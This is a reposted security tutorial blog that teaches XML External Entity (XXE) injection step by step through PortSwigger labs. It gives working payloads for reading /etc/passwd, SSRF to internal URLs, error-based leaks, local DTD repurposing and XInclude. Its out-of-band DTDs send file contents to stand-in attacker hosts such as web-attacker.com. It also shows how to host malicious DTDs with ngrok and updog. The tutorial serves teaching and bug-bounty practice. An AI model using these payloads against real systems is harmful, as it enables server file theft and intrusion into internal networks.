# :globe_with_meridians: Xxe From Zero To Hero B38118750556

> **Original Source:** [Xxe From Zero To Hero B38118750556](https://infosecwriteups.com/xxe-from-zero-to-hero-b38118750556)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

Hello fellow hackers, I hope you all are doing good and learning something new :) . As i said in my [RECON blog](https://newrouge.medium.com/recon-for-dummies-632f8f50ce12) I will be writing about what have i learned this week. Now this week i tried many things e.g. Submitted some bugs but got duped and informative. Tried setting up genymotion for Android testing but no luck in that also. Had to reinstall windows and ubuntu again and all my tools, somehow i messed up my c drive and corrupted my booting process. Anyway something that really completed is that I learned XXE, and i am confident enough that i can teach one or two things to people who wants to learn XXE. I will write how and what i learned. Let’s dive into it.


Now XXE stands for *XML External Entity. *First trivial thing to understand is that XXE is possible only in application which processes XML data in client side or server side,one more thing to note down docx,xlsx,pptx all are XML file types. XXE involves exploiting how the application processes the inclusion of external entities in its input. You can use an XXE to extract information from a server or to call on a malicious server.XXE can be exploited with file upload also. If it all feels like too much just relax and just read along.


Why does XXE vulnerability arises?


If the application uses XML to transmit or store data between browser and server, and XML specification contains various potentially dangerous features, and standard parsers support these features which can lead to XXE.


Now before learning about XXE,

## Let’s learn about XML, Entities and DTD.


>

XML stands for extensible markup language


XML looks kind of similar to HTML but unlike HTML XML does not have predefined tags and and we can define our own tags. One also important fetaure to note that in HTML we can even not close some tags it still works.e.g. <h1>Title will work without </h1> closing tag. but in XML All tags are needed to be closed.


### XML Entities :


Whenever we want to represent some data in XML we will use XML entities for that in picture *add1 & add2 *are xml entities and store data that is some address. If you have some programming background you can think of it as a variable which stores some data in it, and whenever we need those data in output we call these entities(variable) by “&ENTITY_NAME;” . Here you can see in line 11 we called add1 by *&add1; *Now address of James will be displayed in response along with his name and phone number.

### DTD ( Document Type Definition):


DTD contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items.


The DTD can be fully self-contained within the document itself (known as an “internal DTD”) or can be loaded from elsewhere (known as an “external DTD”) or can be hybrid of the two.


In above example A DTD is defined regarding a structure of customers of a application. And it is an example of internal dtd because the values of add1 and add2 are loaded from dtd itself, not from a exterrnal source(URL/URI).


If a DTD tries to load some data from outside of DTD then it is a external DTD, and in that case a *SYSTEM* keyword is used which instruct the DTD to load data from the following URI.


e.g loading data from some external URL

>

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://normal-website.com/some-data" > ]>`


or loading data from server itself.

>

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///path/to/file" > ]>`


Now whenever &xxe will be called in XML data from these URI will be loaded in response of application.


Now we will try to abuse these Entities feature to load data from external source. (XML External Entity i.e. XXE)


Now portswigger provide great labs to put your learning into testing. I will follow the path from basic labs to advanced xxe injection.


PS: I won’t be writing solution to these labs, that’s something you do on your own. And there are already many videos and blogs giving solution to these labs, so there is no point in giving away solution. You read and learn and exploit on your own.


Now if xxe is available what things you can achieve:


> Exfiltrate data from server like reading content of /etc/passwd etc.


> Achieve SSRF by XXE by telling the server to load data from internal urls, as request is originating from server itself you will be able to hit internal urls.


> Exfiltrate data by making request to your server(out of band request), if application doesn’t allow regular entities(e.g. &xxe) or don’t display display any output of your xxe paylaod meaning it’s a Blind xxe you confirm that by making out of band request.


> Forcing the application to cause error and load your xxe ouput along with system error.


Now before moving ahead i want you to watch this video of STOK, I am not promoting pentesterlab in anyway. I just want you to watch the part where he solves a XXE exercise, because i think it always good to have some visual in your mind.

*STOK Pentesterlab*


From this video you will see that how we can introduce our own tags and entities and call these entities. Don’t mind if you don’t understand anything just have a coffee and watch it as any other youtube video. I watched it atleast 5–6 times along this XXE journey.


PS: Don’t think about anything else just see how he defines the XML entities& DTD. That’s it.

## Exploiting XXE to retrieve files


LAB 1: [https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)


Now in here you will see that application accepts xml data and processes it to. So let’s check if it is vulnerable.


(I am assuming that you know how to intercept traffic and test the request flow. If not learn that first.)


Let’s introduce our DTD in XML data


`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`


here a DTD is defined which loads some data for our variable/entity xxe from an external source. SYSTEM is a keyword and file:// works like http://


This DTD here is instructing the XML parser to load data from /etc/passwd nad display it whenever &xxe; is called.


This you can ask for any data that is accessible by web user from the server. like /etc/hostname, etc. you give any linux path here after file:// ofcourse if it is only linux server.

## Exploiting XXE to perform SSRF attacks


>

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`


PS: you can choose any name instead of foo, that’s not a part of syntax.


IN this DTD xxe entity is trying to load data from a internal url and this url can be anyhting. This way you can even loads server’s cloud info if it uses some cloud services. If you don’t have some basic knowledge of SSRF i would recommend to learn and take paylaods from this awesome repository.

## Blind XXE vulnerabilities


This means that the application is vulnerable but does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible. you just can’t directly read contents of /etc/passwd. instead you will have to load content of /etc/passwd and send it as a parameter to your server by Out of Band request. In these labs portswigger provide a exploit server.


I think portswigger made a little bit things complex, if you can understand from their solution ,they tend to use both burp collborator and exploit server and do then some tricky stuff, You are most welcome to follow that it your methodology. I am here to talk about XXE not how you exploit it.


I like to keep things simple so i did everything with exploit server only for delivering the payload and getting the output in my exploit server log.


Now Befor spraying your paylaod on server you should confirm first that application is vulnerablt to make Out of Band request or not. It can be done by just giving a simple harmeless url of your server in XML entity and monitor for if any you have received a GET requets from victim server.


Now practical part: Just submit this DTD in xml body

>

`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`


I hope by now you must have already understood what’s happening here. A DTD is defined which have a entityy xxe which makes a request to your exploit or burp collab server. Just call this xxe enity and wait for DNS and HTTP request in collaborator. In case of exploit server you can see only get request not DNS request.


Note: DNS lookups are visible only if you have a your own DNS server running on your ip. For security reasons portswigger doesn’t allow interaction to external servers. So you have to use their server only.


PARAMETRIC ENTITIES:


Sometimes XML parsers or application itself block uses of regular entities meaning you can’t just define a entity named xxe and call it by &xxe;


In this case you have to use parametric enitity which can be used referenced within the DTD.


The declaration of an XML parameter entity includes the percent character before the entity name:


`<!ENTITY % xxe "my parameter entity value" >`


and to refer this entity you will use %xxe; (calling the entity)


TO check for out of band request DTD will look like with parametric entity:


`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`


Note: Here calling of entity is done inside the DTD only.


You will see a interaction from victim server to your server.

## Exploiting blind XXE to exfiltrate data out-of-band


You will load sensitive data in a entity and send it as parameter to your server url, because application was not giving back any response for xxe.


SO after detecting the BLIND XXE we will exfiltrate some data from victim server. Now this is multi step process and can be done in two ways. Let’s understand portswigger one first.


- We will make request to our exploit server on a endpoint where a dtd file is hosted already.

- Now this dtd file have malicious XML code that on parsing loads sensitive data and make a request to your server with that data.


Just put this DTD in XML data.


## Get newrouge’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>`


Replace the url with your exploit server url/exploit


With this %xxe; calling your entity will make a request to your exploit server which hosts a dtd file with following content


`<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;`


Replace URL with your exploit server url.


- First a file paramteric entity aks the xml to load the content of /etc/passwd


2. Then a second entity named eval is defined whose value itself is another entity so we HTML encoded the % to &#25; . Take proper care of quotes and brackets.


3. Now %eval is called which dynamically forms the url with data as a parameter to that url


4. %exfiltrate finally makes thhe request to formed url.


you will receive the content of /etc/passwd in server’s log.


Another method would be:


<!DOCTYPE data [ <!ENTITY % file SYSTEM “file:///etc/passwd”> <!ENTITY % dtd SYSTEM “[http://attacker.com/evil.dtd](http://attacker.com/evil.dtd)">%dtd; ]>


Here we have defined 2 Entities. one to which file to load and other is making a request to attacker server which is hosted with a malicious dtd file.


evil.dtd:

>

<!ENTITY % all “<!ENTITY send SYSTEM ‘http://attacker.com/?collect=%file;'>">


%all;


Here difference is that in dtd file we are not asking which file to load, did already in xml request, secondly the dynamically created *send* entity is not a parameteric entity and need to be called in xml request with *&send; *in order to send the data to attacker server.

### Exfiltration by error message:


If the application shows every error occured in response, then we can force the error in xml parsing and the application will show what error occured along with our xxe output.


e.g.

>

<!ENTITY % file SYSTEM “file:///etc/passwd”>
<!ENTITY % eval “<!ENTITY &#x25; error SYSTEM ‘file:///nonexistant/%file;’>”>
%eval;
%error;


Here first we call a external dtd on malicious server (not gonna write it again)


- Now the malicious dtd loads the content of /etc/passwd


2.Dynamically create a URL /nonexistent/%file which loads data of /etc/passwd in it as a parameter.


3. when url is requested it causes an error because /nonexistent/ is not a valid path .


so final output contains error not found /nonexistent/<output of /etc/passwd>

## Blind XXE by repurposing a local DTD:


Imagine in a situation in which Normal XXE is not possible and only blind xxe is possible. Even in Blind XXE Out-of-Band request is blocked by firewall.


So what’s the soulution here, Some application might block HTTP requests to avoid out of band connections. in that case you look for DNS lookups to your server. To monitor for DNS lookups we need a VPS . If you can have a VPS well and good make your VPS available for XXE exploitaion check its logs, you can google it how to do it.


Now what if even DNS lookups are disabled or you can’t have a DNS server. SO in case of Blind XXE and No out of Band request we can repurpose local DTD on server.


This means that we find a DTD that is already available on server.(every window and linux machine have some dtd whose code is mostly public).


We pick a Entity of that DTD we found & redefines its structure and delibrately causes an error in it to include that error in server response along with our xxe data.


ALL XML entities are constant and if we define 2 entities with same name then XML will parse the first one. So in our case the Definition we give for Entity is priortized over that is already defined in server’s dtd.


`<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>`


Here it looks complex but i will break it down for you.


- A DTD file is loaded in local_dtd variable that already exist.

- we pick a entity from this DTD whose name is custom_entity

- we change the content of this custom_entity, by dynamically creating a nother entity in it to load content of /etc/passwd.

- Another entity is to create another in it named error to cause an error.


Everything is HTML encoded because it’s all inside the definition of custom_entity. You can notice that Entities inside custom_entity is similar as we wrote in XXE with error message in previous section. Differnce is just that its all a definition of custom_entity and HTML encoded.

## Some interesting place to look for XXEs:


## XInclude attacks:


Now concept of this attack is simple what if application don’t uses XML to transmit data from client to server. so you can not write ant DTD neither Blind xxe is possible. Because you just simply don’t control the XML here.


But what if sever process the user supplied data in SOAP request in Back End. A SOAP request also uses XML and parses the XML entities.


In this case we can use XInclude which is used to build large XML doucments from other smaller independent smaller XML doucments.


So we can supply a input as a XML which will pe parsed as an xml in back end.


of course you can’t know which parameter it is real life so you have to test which parameter is vulnerable and refelcts back the repsonse.


`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>`

## XXE attacks via file upload:


keep an eye on what file types are application accepting and can it be abused for xxe. like docx, xlsx sheets, ppts they also uses xml.


If application accepts png and jpg file it might also accept scg file.


Look for xxe by svg file. Do the Portswigger lab.


XXE by content type:


It’s more like testing if application accepts the xml and document or not if yes then go ahead with your xxe testing on application.


If you can remember How STOK changed the content type to text/xml and application parsed it, meaning it is go ahead sign to check for xxe.


Now if you are like me which don’t have a VPS and wanna test on real application for out of band requests and delivering malicious dtd by hosting it on your server. I might save somethin for you:


- Install ngrok on your system.


> To exploit the OUT OF BAND REQUEST what you need is publically accessible ip, we will use ngrok for that.


2. updog to host dtd file on your local machine


> It’s similar python simplehttpserver 80 something,but screw writing all that.


> Just install updog with

>

pip3 install updog


write a malicious DTD of your need and then host it with updog by just typing

>

updog


default ip of updog is 9090 you can change it to any port.


Now as we are hosting our DTD file we need to make it publically accessible.

>

ngrok http 9090


It will create a unique URL for you which is publically accessiblr from internet and when loaded resolves to your local server and port 9090.


Just write malicious DTD with your ngrok url and host it back on the same port 9090 with updog. If you get an error of address alredy in use. just force kill that process and start it again with updog on 9090/or any port of your choice.


It still don’t solve the problem of detectin g XXE with DNS lookups if HTTP request are blocked. We can’t do anything about that VPS is must in that scenario.


Hey but you are now fully ready for testing for XXE with external entities and and Blind xxe with out of band requests or error based xxe or Xinclude xxe or file upload xxe.


I hope you can learn something from this blog post, You can’t master it one day so take it as a guide and invest atleast 1 week to learn it. Read blog again and again , solve all XXE labs, google the stuff you don’t understand. Still you think it’s not clear just ping me on twitter i will help you. [@avinashkroy](https://twitter.com/Avinashkroy)* .*


After learning xxe its time to hunt on programs. Read disclosed report to see where others and how they have been finding XXE which features were vulnerable. I wish you luck , You wish me some luck :). Gonna look for XXE from tomorrow on real targets. I will let you guys know if i find some bugs.


Thank you , Happy Hacking! & stay Safe!

---

*Originally published on [Medium](https://infosecwriteups.com/xxe-from-zero-to-hero-b38118750556). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
